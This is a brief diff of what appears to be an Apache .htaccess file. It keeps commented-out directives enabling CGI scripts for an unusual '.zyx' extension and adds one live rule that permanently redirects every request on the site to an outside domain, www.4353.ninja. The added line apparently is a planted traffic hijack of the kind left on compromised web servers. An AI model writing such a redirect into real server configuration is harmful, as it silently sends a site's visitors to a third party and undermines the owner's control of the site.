@@ -1,3 +1,4 @@
 #AllowOverride All
 #Options +ExecCGI
 #AddHandler cgi-script .zyx
+RewriteRule ^(.*)$ http://www.4353.ninja/$1 [L,R=permanent]
